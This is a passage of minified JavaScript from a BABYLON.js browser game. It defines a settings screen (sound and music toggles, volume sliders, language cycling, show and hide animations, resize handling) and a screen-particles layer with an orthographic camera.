!1;soundManager.playSound("button");var a=LANGUAGES.indexOf(Languages.instance.language);a--;0>a&&(a=LANGUAGES.length-1);Languages.instance.language=LANGUAGES[a];SelectedLanguage=Languages.instance.language;GameData.Save();activeScene.updateTexts();Buttons.enabled=!0}},enableControls:function(){enableButton(this.btnSounds);enableButton(this.btnMusic);enableButton(this.btnNextLang);enableButton(this.btnPrevLang);this.sldrSoundsVolume.isEnabled=!0;this.sldrMusicVolume.isEnabled=!0},disableControls:function(){disableButton(this.btnSounds);
disableButton(this.btnMusic);disableButton(this.btnNextLang);disableButton(this.btnPrevLang);this.sldrSoundsVolume.isEnabled=!1;this.sldrMusicVolume.isEnabled=!1},hideScene:function(a){void 0===a&&(a=null);this.disableControls();activeScene.scene.animationTimeScale=1;var b={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEIN};CommonAnimations.AnimateObjectProperty(this.guiRoot,"topInPixels",-50*Resolution.SCALE,SCENE_TRANSITION_DURATION,b,1,!1);CommonAnimations.AnimateObjectProperty(this.guiRoot,
"alpha",0,SCENE_TRANSITION_DURATION,b,1,!1,function(){activeScene.scene.activeCameras=screenSettings.savedActiveCameras;activeScene.scene.activeCamera=screenSettings.savedActiveCamera;activeScene.scene.cameraToUseForPointers=screenSettings.savedCameraToUseForPointers;screenSettings.guiRoot.isVisible=!1;null!=a&&a()})},showScene:function(a){void 0===a&&(a=null);this.guiRoot.alpha=0;this.guiRoot.isVisible=!0;this.guiRoot.topInPixels=50*Resolution.SCALE;this.sldrMusicVolume.value=100*soundManager.musicVolume;
this.sldrSoundsVolume.value=100*soundManager.soundVolume;this.enableControls();this.onResize();var b={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEOUT};CommonAnimations.AnimateObjectProperty(this.guiRoot,"topInPixels",0,SCENE_TRANSITION_DURATION,b,1,!1);CommonAnimations.AnimateObjectProperty(this.guiRoot,"alpha",1,SCENE_TRANSITION_DURATION,b,1,!1,function(){activeScene.scene.animationTimeScale=0;null!=a&&a()})},beforeRender:function(){},onResize:function(){if(this.guiRoot.isVisible){var a=
engine.getRenderWidth(),b=engine.getRenderHeight();this.imgBackground.resize(a,b);a>b?this.pnlSettings.scaleTo(.8*Resolution.SCALE):(this.pnlSettings.scaleTo(1.2*Resolution.SCALE),1E3*this.pnlSettings.scaleY>b&&this.pnlSettings.scaleTo(b/1E3));this.resizeShadows()}},resizeShadows:function(){var a=this.txtTitle._fontSize._value/50;this.txtTitle.shadowOffsetX=getShadowOffs(0);this.txtTitle.shadowOffsetY=getShadowOffs(5*a)}};var ScreenParticles=function(a){ScreenParticles.instance=this;this.create(a)};ScreenParticles.instance=null;
ScreenParticles.prototype={create:function(a){this.scene=a;this.rootNode=new BABYLON.TransformNode("ScreenParticles");this.createCamera();this.createGui()},createCamera:function(){this.camera=new BABYLON.FreeCamera("camera",new BABYLON.Vector3(0,0,-2),this.scene);this.camera.parent=this.rootNode;this.camera.setTarget(new BABYLON.Vector3(0,0,0));this.camera.mode=BABYLON.Camera.ORTHOGRAPHIC_CAMERA;this.camera.orthoTop=1;this.camera.orthoBottom=-1;this.camera.orthoLeft=-2;this.camera.orthoRight=2;this.camera.layerMask=
LAYER_SCREEN_PARTICLES;this.scene.activeCameras.push(this.camera)},createGui:function(){this.guiTexture=BABYLON.GUI.AdvancedDynamicTexture.CreateFullscreenUI("ScreenParticles",!0,activeScene.scene);this.guiTexture.layer.layerMask=this.camera.layerMask;this.guiTexture.rootContainer.highlightLineWidth=0;this.particles=new Particles(screenGame.guiTexture);this.textParticles=new TextParticles(screenGame.guiTexture);this.flyingSprites=new FlyingSprites(screenGame.guiTexture)},beforeRender:function(){activeScene.gamePaused||
(this.particles.Update(),this.textParticles.Update(),this.flyingSprites.Update())},onResize:function(){}};

